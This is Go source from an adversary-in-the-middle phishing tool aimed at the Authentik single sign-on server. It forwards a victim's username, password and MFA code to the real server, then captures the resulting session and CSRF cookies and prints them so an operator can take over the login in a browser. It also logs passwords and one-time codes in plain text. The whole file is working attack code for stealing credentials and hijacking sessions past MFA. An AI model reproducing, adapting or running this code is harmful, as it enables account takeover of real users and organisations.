package authentik_util

import (
    "encoding/json"
    "errors"
    "fmt"
    "net/http"
    "strings"

    "aitm/pkg/logger"
    "aitm/pkg/http_util"
)

const (
    MAIN_FLOW_URL = "/if/flow/default-authentication-flow/"
    AUTH_API_URL = "/api/v3/flows/executor/default-authentication-flow"

    AUTH_STAGE_IDENTIFICATION = "ak-stage-identification"
    AUTH_STAGE_PASSWORD = "ak-stage-password"
    AUTH_STAGE_MFA = "ak-stage-authenticator-validate"
    AUTH_STAGE_SUCCESS = "xak-flow-redirect"

    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
    CSRF_COOKIE_NAME = "authentik_csrf"
    AUTH_ATTEMPT_COOKIE_NAME = "authentik_session"
    AUTH_SESSION_COOKIE_NAME = "authentik_session"
)

// Defines the possible login form fields
type LoginRequest struct {
    // Indicates current authentication phase
    Stage string `json:"component"`

    // Credential fields
    Username string `json:"uid_field"`
    Password string  `json:"password"`
    Token string `json:"code"`
}

// Defines MFA challenge fields that the real Authentik server provides
type MfaChallenge struct {
    DeviceType string `json:"device_class"`
    DeviceUID string `json:"device_uid"`
}

// Defines login error messages from the real Authentik server
type AuthentikError struct {
    Message string `json:"string"`
    Code string `json:"code"`
}

// Defines login responses from the real Authentik server
type AuthentikResponse struct {
    // Indicates next authentication phase for user
    Stage string `json:"component"`

    Username string `json:"pending_user"`

    // Avatar image data to display in login form
    AvatarData string `json:"pending_user_avatar"`

    Errors struct {
        // Password-related authentication errors
        PasswordErrors []AuthentikError `json:"password"`

        // Generic login form-related errors
        NonFieldErrors []AuthentikError `json:"non_field_errors"`

        // MFA-related authentication errors
        OtpErrors []AuthentikError `json:"code"`
    } `json:"response_errors"`

    // MFA challenge information
    Challenges []MfaChallenge `json:"device_challenges"`
}

// Sends the required HTTP requests to the Authentik server to obtain an authentication
// attempt cookie to use in future authentication-related requests for this user
func GetAuthAttemptCookie(authentikBaseUrl string, username string, reqHeaders map[string]string) (string, error) {
    logger.Debug(fmt.Sprintf("Getting auth attempt cookie from target Authentik server for user %s", username))
    _, statusCode, respCookies, err := http_util.PerformHttpGet(fmt.Sprintf("%s%s?next=%%2F", authentikBaseUrl, MAIN_FLOW_URL), "", reqHeaders)
    if err != nil {
        return "", err
    } else if (statusCode != http.StatusOK) {
        return "", errors.New(fmt.Sprintf("Non-200 response code for main flow URL: %d", statusCode))
    }

    var cookieVal string

    // Grab the auth attempt cookie
    for _, cookie := range respCookies {
        if strings.EqualFold(cookie.Name, AUTH_ATTEMPT_COOKIE_NAME) {
            cookieVal = cookie.Value
            break
        }
    }

    _, statusCode, respCookies, err = http_util.PerformHttpGet(fmt.Sprintf("%s%s/?query=next%%3D%%252F", authentikBaseUrl, AUTH_API_URL), "", reqHeaders)
    if err != nil {
        return "", err
    } else if (statusCode != http.StatusOK) {
        return "", errors.New(fmt.Sprintf("Non-200 response code for auth API URL: %d", statusCode))
    }

    // Grab the auth attempt cookie
    for _, cookie := range respCookies {
        if strings.EqualFold(cookie.Name, AUTH_ATTEMPT_COOKIE_NAME) {
            if len(cookieVal) > 0 && !strings.EqualFold(cookie.Value, cookieVal) {
                return "", errors.New(fmt.Sprintf("Auth attempt cookie mismatch between main flow URL and auth API URLs. Expected %s, received %s", cookieVal, cookie.Value))
            }
            logger.Debug(fmt.Sprintf("Got auth attempt cookie for user %s: %s", username, cookie.Value))
            return cookie.Value, nil

        }
    }
    return "", errors.New("Authentik server did not provide auth attempt cookie.")
}

// Send username to Authentik server and verify correct server response
func SubmitUsername(authentikBaseUrl string, username string, cookieStr string, reqHeaders map[string]string) (string, int, error) {
    logger.Debug(fmt.Sprintf("Submitting username %s", username))
    postData := fmt.Sprintf("{\"component\": \"%s\",\"uid_field\":\"%s\"}", AUTH_STAGE_IDENTIFICATION, username)
    authentikRespData, statusCode, _, err := http_util.PerformHttpPost(fmt.Sprintf("%s%s/?query=next%%3D%%252F", authentikBaseUrl, AUTH_API_URL), "application/json", cookieStr, reqHeaders, []byte(postData))
    if err != nil {
        return "", http.StatusInternalServerError, errors.New(fmt.Sprintf("Failed to submit username: %s", err.Error()))
    } else if (statusCode != http.StatusOK) {
        return "", statusCode, errors.New(fmt.Sprintf("Non-200 response when submitting username: %d", statusCode))
    }

    // Check if we can advance to the password stage
    var authentikResp AuthentikResponse
    if err = json.Unmarshal(authentikRespData, &authentikResp); err != nil {
        return "", http.StatusInternalServerError, errors.New(fmt.Sprintf("Failed to parse server response for username submission: %s", err.Error()))
    }
    authentikRespStr := string(authentikRespData)
    logger.Debug(fmt.Sprintf("Response from authentik server: %s", authentikRespStr))
    if authentikResp.Stage == AUTH_STAGE_PASSWORD {
        // Advance victim to password stage
        logger.Info(fmt.Sprintf("Authentik server successfully accepted username %s. Advancing to password stage.", username))
        return authentikRespStr, http.StatusOK, nil
    }
    return "", http.StatusInternalServerError, errors.New("Authentik server did not accept username.")
}

// Send password to Authentik server and verify correct server response
func SubmitPassword(authentikBaseUrl string, username string, password string, cookieStr string, reqHeaders map[string]string) (string, int, error) {
    logger.Debug(fmt.Sprintf("Submitting password %s for user %s", password, username))
    postData := fmt.Sprintf("{\"component\": \"%s\",\"password\":\"%s\"}", AUTH_STAGE_PASSWORD, password)
    authentikRespData, statusCode, respCookies, err := http_util.PerformHttpPost(fmt.Sprintf("%s%s/?query=next%%3D%%252F", authentikBaseUrl, AUTH_API_URL), "application/json", cookieStr, reqHeaders, []byte(postData))
    if err != nil {
        return "", http.StatusInternalServerError, errors.New(fmt.Sprintf("Failed to submit password: %s", err.Error()))
    } else if (statusCode != http.StatusOK) {
        return "", statusCode, errors.New(fmt.Sprintf("Non-200 response when submitting password: %d", statusCode))
    }

    // Check if we can advance to the MFA stage or if login succeeded/failed
    var authentikResp AuthentikResponse
    if err = json.Unmarshal(authentikRespData, &authentikResp); err != nil {
        return "", http.StatusInternalServerError, errors.New(fmt.Sprintf("Failed to parse server response for password submission: %s", err.Error()))
    }
    authentikRespStr := string(authentikRespData)
    logger.Debug(fmt.Sprintf("Response from authentik server: %s", authentikRespStr))
    if authentikResp.Stage == AUTH_STAGE_SUCCESS {
        // No MFA needed for this user - successful login
        if err = HandleSuccessfulLogin(username, respCookies); err != nil {
            return "", http.StatusInternalServerError, err
        }
        return authentikRespStr, http.StatusOK, nil
    } else if authentikResp.Stage == AUTH_STAGE_MFA {
        // Advance victim to MFA stage
        logger.Info(fmt.Sprintf("Authentik server successfully accepted password for user %s. Advancing to MFA stage", username))
        return authentikRespStr, http.StatusOK, nil
    } else {
        // Password wasn't accepted
        // Check error messages to see if invalid credentials were provided
        for _, passwordErrors := range authentikResp.Errors.PasswordErrors {
            if strings.EqualFold(passwordErrors.Message, "Invalid password") {
                logger.Warning(fmt.Sprintf("Invalid password for user %s", username))
                // We don't consider an invalid password as a server error
                return authentikRespStr, http.StatusUnauthorized, nil
            }
        }
    }
    // Catch-all error
    return "", http.StatusInternalServerError, errors.New("Authentik server did not accept password submission request.")
}

// Send MFA token to Authentik server and verify correct server response
func SubmitMfaToken(authentikBaseUrl string, username string, token string, cookieStr string, reqHeaders map[string]string) (string, int, error) {
    logger.Debug(fmt.Sprintf("Submitting MFA token %s for user %s", token, username))
    postData := fmt.Sprintf("{\"component\": \"%s\",\"code\":\"%s\"}", AUTH_STAGE_MFA, token)
    authentikRespData, statusCode, respCookies, err := http_util.PerformHttpPost(fmt.Sprintf("%s%s/?query=next%%3D%%252F", authentikBaseUrl, AUTH_API_URL), "application/json", cookieStr, reqHeaders, []byte(postData))
    if err != nil {
        return "", http.StatusInternalServerError, errors.New(fmt.Sprintf("Failed to submit MFA token: %s", err.Error()))
    } else if (statusCode != http.StatusOK) {
        return "", statusCode, errors.New(fmt.Sprintf("Non-200 response when submitting submitting MFA token: %d", statusCode))
    }

    // Check if login succeeded/failed
    var authentikResp AuthentikResponse
    if err = json.Unmarshal(authentikRespData, &authentikResp); err != nil {
        return "", http.StatusInternalServerError, errors.New(fmt.Sprintf("Failed to parse server response for MFA token submission: %s", err.Error()))
    }
    authentikRespStr := string(authentikRespData)
    logger.Debug(fmt.Sprintf("Response from authentik server: %s", authentikRespStr))
    if authentikResp.Stage == AUTH_STAGE_SUCCESS {
        // Correct token was provided - successful login!
        if err = HandleSuccessfulLogin(username, respCookies); err != nil {
            return "", http.StatusInternalServerError, err
        }
        return authentikRespStr, http.StatusOK, nil
    } else {
        // MFA token not accepted
        // Check error messages to see if the token was incorrect
        for _, tokenErrors := range authentikResp.Errors.OtpErrors {
            if strings.EqualFold(tokenErrors.Message, "Invalid Token. Please ensure the time on your device is accurate and try again.") {
                logger.Warning(fmt.Sprintf("Invalid token for user %s.", username))
                // We don't consider an invalid token as a server error
                return authentikRespStr, http.StatusUnauthorized, nil
            }
        }
    }
    // Catch-all error
    return "", http.StatusInternalServerError, errors.New("Authentik server did not accept MFA token submission request.")
}

// Extracts the final session cookie and logs the necessary cookies for the operator
// to perform the SSO login bypass
func HandleSuccessfulLogin(username string, respCookies []*http.Cookie) error {
    logger.Success(fmt.Sprintf("Successful login for user %s", username))
    found_session_cookie := false
    found_csrf_token := false
    session_cookie := ""
    csrf_token := ""

    for _, cookie := range respCookies {
        if strings.EqualFold(cookie.Name, AUTH_SESSION_COOKIE_NAME) {
            session_cookie = cookie.Value
            logger.Info(fmt.Sprintf("Obtained final session cookie for user %s: %s", username, session_cookie))
            found_session_cookie = true
        }
        if strings.EqualFold(cookie.Name, CSRF_COOKIE_NAME) {
            csrf_token = cookie.Value
            logger.Info(fmt.Sprintf("Obtained CSRF token for user %s: %s", username, csrf_token))
            found_csrf_token = true
        }
    }
    if !found_session_cookie {
        return errors.New(fmt.Sprintf("Authentik Server did not provide final session cookie for user: %s", username))
    }
    if !found_csrf_token {
        return errors.New(fmt.Sprintf("Authentik Server did not provide CSRF token cookie for user: %s", username))
    }

    logger.Success(fmt.Sprintf(
        "Use the following cookie names and values to bypass login in a browser window:\n\t%s: %s\n\t%s: %s",
        AUTH_SESSION_COOKIE_NAME,
        session_cookie,
        CSRF_COOKIE_NAME,
        csrf_token,
    ))
    return nil
}
